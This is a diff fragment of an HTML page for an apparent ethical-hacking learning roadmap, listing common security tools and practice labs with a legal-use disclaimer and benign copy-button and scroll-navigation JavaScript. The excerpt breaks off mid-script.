+      <div class="tool-chip"><span class="tool-emoji">🗺️</span><div><div class="tool-name">Nmap</div><div class="tool-use">Port scanner</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🦈</span><div><div class="tool-name">Wireshark</div><div class="tool-use">Packet analysis</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🔫</span><div><div class="tool-name">Metasploit</div><div class="tool-use">Exploitation</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🔬</span><div><div class="tool-name">Burp Suite</div><div class="tool-use">Web proxy</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">💉</span><div><div class="tool-name">SQLMap</div><div class="tool-use">SQL injection</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🔑</span><div><div class="tool-name">Hashcat</div><div class="tool-use">Password cracking</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🔓</span><div><div class="tool-name">John the Ripper</div><div class="tool-use">Hash cracking</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">📡</span><div><div class="tool-name">Aircrack-ng</div><div class="tool-use">WiFi attacks</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🩸</span><div><div class="tool-name">BloodHound</div><div class="tool-use">AD attack paths</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🐱</span><div><div class="tool-name">Mimikatz</div><div class="tool-use">Credential dump</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🦊</span><div><div class="tool-name">Gobuster</div><div class="tool-use">Dir enumeration</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🔭</span><div><div class="tool-name">Shodan</div><div class="tool-use">OSINT/IoT search</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🛡️</span><div><div class="tool-name">Nikto</div><div class="tool-use">Web vuln scan</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">⚡</span><div><div class="tool-name">ffuf</div><div class="tool-use">Web fuzzing</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🐙</span><div><div class="tool-name">Ghidra</div><div class="tool-use">Reverse eng.</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">💻</span><div><div class="tool-name">Hydra</div><div class="tool-use">Brute force</div></div></div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- PRACTICE LABS -->
+  <!-- ════════════════════════════════════ -->
+  <div class="tools-section" id="labs">
+    <h2 class="section-title">🏋 Practice Platforms</h2>
+    <div class="tools-grid">
+      <div class="tool-chip"><span class="tool-emoji">🟩</span><div><div class="tool-name">HackTheBox</div><div class="tool-use">Realistic machines</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🟦</span><div><div class="tool-name">TryHackMe</div><div class="tool-use">Guided paths</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🏁</span><div><div class="tool-name">CTFtime</div><div class="tool-use">Competitions</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🎯</span><div><div class="tool-name">PicoCTF</div><div class="tool-use">Beginner CTF</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🕸️</span><div><div class="tool-name">DVWA</div><div class="tool-use">Vulnerable web app</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🧨</span><div><div class="tool-name">Metasploitable</div><div class="tool-use">Vulnerable VM</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">🎪</span><div><div class="tool-name">VulnHub</div><div class="tool-use">Free vulnerable VMs</div></div></div>
+      <div class="tool-chip"><span class="tool-emoji">📚</span><div><div class="tool-name">PortSwigger Labs</div><div class="tool-use">Web security</div></div></div>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <p>Built for aspiring <span class="green">ethical hackers</span> worldwide</p>
+  <p>Always get <span class="green">written permission</span> before testing any system</p>
+  <p style="margin-top:8px; color: rgba(90,122,106,0.5); font-size:11px;">Unauthorized hacking is illegal. This roadmap is for educational purposes only.</p>
+</footer>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+  // Copy button functionality
+  document.querySelectorAll('.code-block').forEach(block => {
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.innerHTML = '⎘ COPY';
+    btn.addEventListener('click', () => {
+      const code = block.querySelector('code').innerText;
+      navigator.clipboard.writeText(code).then(() => {
+        btn.innerHTML = '✓ COPIED';
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.innerHTML = '⎘ COPY';
+          btn.classList.remove('copied');
+        }, 2000);
+      });
+    });
+    block.appendChild(btn);
+  });
+
+  // Animate progress bar on load
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      document.querySelector('.progress-fill') && (document.querySelector('.progress-fill').style.width = '0%');
+    }, 100);
+  });
+
+  // Highlight active nav on scroll
+  const phases = document.querySelectorAll('.phase, .tools-section');
+  const navLinks = document.querySelectorAll('nav a');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        navLinks.forEach(link => {
+          link.style.b
